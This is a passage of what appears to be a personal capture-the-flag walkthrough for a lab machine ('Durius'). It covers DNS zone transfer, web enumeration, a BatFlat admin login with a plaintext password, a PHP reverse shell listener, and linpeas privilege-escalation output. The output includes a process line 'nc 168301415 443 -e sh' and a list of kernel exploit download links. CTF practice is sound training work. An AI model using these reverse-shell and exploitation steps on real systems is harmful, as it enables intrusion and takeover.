kfc.mofo.pwn.		14400	IN	A	192.168.150.17
leet.mofo.pwn.		14400	IN	A	192.168.150.13
mail.mofo.pwn.		14400	IN	TXT	"v=spf1 a -all"
mail.mofo.pwn.		14400	IN	A	192.168.150.11
milo.mofo.pwn.		14400	IN	A	192.168.150.16
newcms.mofo.pwn.	14400	IN	CNAME	durius.mofo.pwn.
ns1.mofo.pwn.		14400	IN	A	192.168.150.100
punk.mofo.pwn.		14400	IN	A	192.168.150.12
sid.mofo.pwn.		14400	IN	A	192.168.150.10
www.mofo.pwn.		14400	IN	CNAME	sid.mofo.pwn.
mofo.pwn.		14400	IN	SOA	ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
;; Query time: 2 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Thu Jan 26 23:13:48 UTC 2023
;; XFR size: 18 records (messages 1, bytes 467)

newcms.mofo.pwn.	14400	IN	CNAME	durius.mofo.pwn.
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ sudo nano /etc/hosts
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ tail /etc/hosts
10.10.148.212 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
127.0.0.1 newcms.mofo.pwn

http://newcms.mofo.pwn:8888/

──(kali㉿kali)-[~/Downloads/time_flies]
└─$ feroxbuster -t 60 -u http://newcms.mofo.pwn:8888/ -k -w /usr/share/wordlists/dirb/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://newcms.mofo.pwn:8888/
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[>-------------------] - 1s         1/4614    1h      found:0       errors:0      
[>-------------------] - 2s         2/4614    1h      found:0       errors:0      
[>-------------------] - 3s         3/4614    1h      found:0       errors:0      
[>-------------------] - 4s         4/4614    1h      found:0       errors:0      
200      GET      143l      471w        0c http://newcms.mofo.pwn:8888/
[>-------------------] - 4s         6/4614    1h      found:0       errors:0      
[>-------------------] - 4s         6/4614    1h      found:0       errors:0   
200      GET        1l        4w        0c http://newcms.mofo.pwn:8888/admin

crash it (again)

http://newcms.mofo.pwn:8888/admin/ (BatFlat)

bash-4.4$ cat creds.txt
cat creds.txt
admin:BAraTuwwWzx3gG

login

https://www.exploit-db.com/exploits/49573

Settings>Theme>Hello (PHP PentestMonkey)

https://www.revshells.com/
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 1337                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

now go to newcms.mofo.pwn:8888/
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 1337                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.214.203.
Ncat: Connection from 10.10.214.203:46396.
Linux Durius 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64 GNU/Linux
 18:13:46 up 16 min,  0 users,  load average: 0.00, 0.02, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (425): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Durius:/$ ls -la
ls -la
total 84
drwxr-xr-x  22 root root  4096 Apr 17  2020 .
drwxr-xr-x  22 root root  4096 Apr 17  2020 ..
drwxr-xr-x   2 root root  4096 Apr 17  2020 bin
drwxr-xr-x   3 root root  4096 Apr 23  2020 boot
drwxr-xr-x  15 root root  2820 Jan 26 17:57 dev
drwxr-xr-x  90 root root  4096 Jan 26 17:57 etc
drwxr-xr-x   4 root root  4096 Apr 23  2020 home
lrwxrwxrwx   1 root root    31 Apr 17  2020 initrd.img -> /boot/initrd.img-3.16.0-6-amd64
drwxr-xr-x  14 root root  4096 Apr 17  2020 lib
drwxr-xr-x   2 root root  4096 Apr 17  2020 lib64
drwx------   2 root root 16384 Apr 17  2020 lost+found
drwxr-xr-x   3 root root  4096 Apr 17  2020 media
drwxr-xr-x   2 root root  4096 Apr 17  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 17  2020 opt
dr-xr-xr-x 105 root root     0 Jan 26 17:56 proc
drwx------   4 root root  4096 Apr 23  2020 root
drwxr-xr-x  20 root root   780 Jan 26 17:57 run
drwxr-xr-x   2 root root  4096 Apr 17  2020 sbin
drwxr-xr-x   2 root root  4096 Apr 17  2020 srv
dr-xr-xr-x  13 root root     0 Jan 26 17:56 sys
drwxrwxrwt   7 root root  4096 Jan 26 18:09 tmp
drwxr-xr-x  10 root root  4096 Apr 17  2020 usr
drwxr-xr-x  12 root root  4096 Apr 23  2020 var
lrwxrwxrwx   1 root root    27 Apr 17  2020 vmlinuz -> boot/vmlinuz-3.16.0-6-amd64
www-data@Durius:/$ cd /home
cd /home
www-data@Durius:/home$ ls
ls
benclower
me
www-data@Durius:/home$ cd me
cd me
bash: cd: me: Permission denied
www-data@Durius:/home$ cd benclower
cd benclower
bash: cd: benclower: Permission denied
```

## Privilege Escalation
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ locate linpeas
/home/kali/0day_ctf/linpeas.sh
/home/kali/Downloads/linpeas.sh
/home/kali/hackthebox/linpeas.sh
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cd /home/kali/0day_ctf/
```
```python
┌──(kali㉿kali)-[~/0day_ctf]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.214.203 - - [26/Jan/2023 19:16:34] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@Durius:/home$ cd /tmp
cd /tmp
www-data@Durius:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
wget http://10.8.19.103:8000/linpeas.sh
converted 'http://10.8.19.103:8000/linpeas.sh' (ANSI_X3.4-1968) -> 'http://10.8.19.103:8000/linpeas.sh' (UTF-8)
--2023-01-26 18:16:34--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  124K 6s
    50K .......... .......... .......... .......... .......... 13%  238K 4s
   100K .......... .......... .......... .......... .......... 19% 4.16M 3s
   150K .......... .......... .......... .......... .......... 26%  268K 2s
   200K .......... .......... .......... .......... .......... 32% 3.33M 2s
   250K .......... .......... .......... .......... .......... 39% 6.38M 1s
   300K .......... .......... .......... .......... .......... 46% 7.15M 1s
   350K .......... .......... .......... .......... .......... 52%  303K 1s
   400K .......... .......... .......... .......... .......... 59% 5.16M 1s
   450K .......... .......... .......... .......... .......... 65% 5.55M 1s
   500K .......... .......... .......... .......... .......... 72% 5.26M 0s
   550K .......... .......... .......... .......... .......... 79% 6.99M 0s
   600K .......... .......... .......... .......... .......... 85% 7.01M 0s
   650K .......... .......... .......... .......... .......... 92% 7.18M 0s
   700K .......... .......... .......... .......... .......... 98%  315K 0s
   750K ........                                              100% 1.65M=1.2s

2023-01-26 18:16:35 (623 KB/s) - 'linpeas.sh' saved [777018/777018]

www-data@Durius:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@Durius:/tmp$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |------------------------------------------------------------------------                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: Durius
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.11 (jessie)
Release:	8.11
Codename:	jessie

╔══════════╣ Sudo version
sudo Not Found

╔══════════╣ CVEs Check
./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found

./linpeas.sh: 1207: ./linpeas.sh: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Thu Jan 26 18:17:03 CST 2023
 18:17:03 up 20 min,  0 users,  load average: 0.28, 0.09, 0.09

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=9644d352-b5a4-4557-bc99-59d12b48946c	/	ext4	errors=remount-ro	0 1
UUID=1fadf358-58e7-49b2-b3e4-5090ad71e3c6	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
USER=www-data
SHLVL=1
HOME=/var/www
OLDPWD=/home
_=./linpeas.sh
HISTSIZE=0
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Exposure: probable
   Tags: [ debian=8 ],ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0; gentoo: <1.10.2-r3

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: less probable
   Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230

╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/docker
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.1  0.4 110740  5008 ?        Ss   17:56   0:01 /sbin/init
root       141  0.0  0.2  28896  3060 ?        Ss   17:56   0:00 /lib/systemd/systemd-journald
root       145  0.1  0.3  40844  3328 ?        Ss   17:56   0:01 /lib/systemd/systemd-udevd
root       367  0.0  0.7  25404  7736 ?        Ss   17:57   0:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       399  0.0  0.2  37084  2604 ?        Ss   17:57   0:00 /sbin/rpcbind -w
statd      409  0.0  0.2  37284  2924 ?        Ss   17:57   0:00 /sbin/rpc.statd
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root       423  0.0  0.0  23360   204 ?        Ss   17:57   0:00 /usr/sbin/rpc.idmapd
root       425  0.0  2.4 383288 24584 ?        Ss   17:57   0:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)                      
www-data   765  0.0  2.2 459796 22564 ?        S    17:57   0:00  _ php-fpm: pool www                                                            
www-data   766  0.0  2.2 459800 23056 ?        S    17:57   0:00  _ php-fpm: pool www                                                            
www-data  1403  0.0  0.0   4340   772 ?        S    18:13   0:00      _ sh -c uname -a; w; id; bash -i
www-data  1407  0.0  0.3  20228  3188 ?        S    18:13   0:00          _ bash -i
www-data  1412  0.0  0.2   5184  2432 ?        S    18:16   0:00              _ /bin/sh ./linpeas.sh
www-data  4748  0.0  0.0   5184   952 ?        S    18:17   0:00                  _ /bin/sh ./linpeas.sh
www-data  4752  0.0  0.2  17656  2084 ?        R    18:17   0:00                  |   _ ps fauxwww
www-data  4751  0.0  0.0   5184   952 ?        S    18:17   0:00                  _ /bin/sh ./linpeas.sh
daemon[0m     427  0.0  0.1  19028  1672 ?        Ss   17:57   0:00 /usr/sbin/atd -f
root       428  0.0  0.2  27528  2768 ?        Ss   17:57   0:00 /usr/sbin/cron -f
root       430  0.0  0.3 258676  3416 ?        Ssl  17:57   0:00 /usr/sbin/rsyslogd -n
message+   432  0.0  0.3  42248  3464 ?        Ss   17:57   0:00 /usr/bin/dbus-daemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       438  0.0  0.2  19880  2608 ?        Ss   17:57   0:00 /lib/systemd/systemd-logind
root       454  0.0  0.1   4260  1664 ?        Ss   17:57   0:00 /usr/sbin/acpid
root       458  0.2  7.3 650032 74668 ?        Ssl  17:57   0:02 /usr/bin/dockerd -H fd://
root       822  0.1  3.7 415276 38812 ?        Ssl  17:57   0:01  _ docker-containerd --config /var/run/docker/containerd/containerd.toml
root      1026  0.0  0.4   7500  4416 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/ef64b5e754cddbc138fda284da0108f513a116a4ccfc32016a376a2328dc5527 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
root      1091  0.0  0.2  11696  2604 ?        Ss+  17:57   0:00      |   _ /bin/bash /usr/sbin/run-vsftpd.sh
root      1286  0.0  0.3  53288  3668 ?        S+   17:57   0:00      |       _ /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
root      1039  0.0  0.4   7500  4432 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/df43dc369c140d1c4cb8ca1bfb71f6dd7092d8fc32fff32fa2fe0b969876ffd1 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
statd     1092  0.0  1.8 207856 18652 ?        Ssl+ 17:57   0:00      |   _ /usr/sbin/named -4 -g -u bind -n 1 -c /etc/bind/named.conf
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root      1048  0.0  0.4   7500  4092 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/1da62c6e70c5a40a858b19534075c74726626c9f35195ac26923b1cde4ebd826 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
root      1105  0.1  1.7  85960 17724 ?        Ss+  17:57   0:01          _ /usr/bin/python2 /usr/bin/supervisord
root      1292  0.0  0.3  13832  3896 ?        S    17:57   0:00              _ nginx: master process /usr/sbin/nginx
systemd+  1294  0.0  0.1  14288  1952 ?        S    17:57   0:00              |   _ nginx: worker process
me        1293  0.1  2.4 110052 25340 ?        S    17:57   0:01              _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1295  0.0  1.9 110460 19784 ?        S    17:57   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1307  0.0  0.0   1564     4 ?        S    17:59   0:00                  |   _ /bin/sh -c cat upload/a.txt;nc 168301415 443 -e sh
me        1309  0.0  0.0   1564     4 ?        S    17:59   0:00                  |       _ sh
me        1310  0.0  0.5  12748  6080 ?        S    17:59   0:00                  |           _ python -c import pty;pty.spawn("/bin/bash")
me        1311  0.0  0.1   6348  1976 ?        Ss   17:59   0:00                  |               _ /bin/bash
me        1316  0.0  0.1   1888  1116 ?        Sl+  18:01   0:00                  |                   _ ./shell.elf
me        1296  0.0  1.9 110984 20368 ?        S    17:57   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1320  0.0  0.0   1564     4 ?        S    18:04   0:00                  |   _ /bin/sh -c cat upload/a.txt;nc 168301415 443 -e sh
me        1322  0.0  0.0   1564     4 ?        S    18:04   0:00                  |       _ sh
me        1324  0.0  0.5  12748  6108 ?        S    18:04   0:00                  |           _ python -c import pty;pty.spawn("/bin/bash")
me        1325  0.0  0.1   6348  1972 ?        Ss+  18:04   0:00                  |               _ /bin/bash
me        1323  0.0  1.9 110104 19440 ?        S    18:04   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
root       460  0.0  0.5  55204  5432 ?        Ss   17:57   0:00 /usr/sbin/sshd -D
root       513  0.0  0.1  14420  2028 tty1     Ss+  17:57   0:00 /sbin/agetty --noclear tty1 linux
root       514  0.0  0.2  14240  2160 ttyS0    Ss+  17:57   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt102
root       730  0.0  0.3  89560  3148 ?        Ss   17:57   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data   731  0.0  0.3  89920  3800 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   732  0.0  0.3  89920  3800 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   733  0.0  0.4  90260  4740 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   734  0.0  0.4  90264  4960 ?        S    17:57   0:00  _ nginx: worker process                           
Debian-+   745  0.0  0.3  53308  3284 ?        Ss   17:57   0:00 /usr/sbin/exim4 -bd -q30m

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Jun 11  2015 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 22  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rw-r--r--  1 root root  712 Aug 14  2019 php

/etc/cron.daily:
total 68
drwxr-xr-x  2 root root  4096 Apr 22  2020 .
drwxr-xr-x 90 root root  4096 Jan 26 17:57 ..
-rw-r--r--  1 root root   102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root   625 Sep 30  2019 apache2
-rwxr-xr-x  1 root root 15000 Jan 22  2019 apt
-rwxr-xr-x  1 root root   314 Nov  8  2014 aptitude
-rwxr-xr-x  1 root root   355 Oct 17  2014 bsdmainutils
-rwxr-xr-x  1 root root  1597 May  2  2016 dpkg
-rwxr-xr-x  1 root root  4125 Sep  5  2019 exim4-base
-rwxr-xr-x  1 root root    89 Nov  8  2014 logrotate
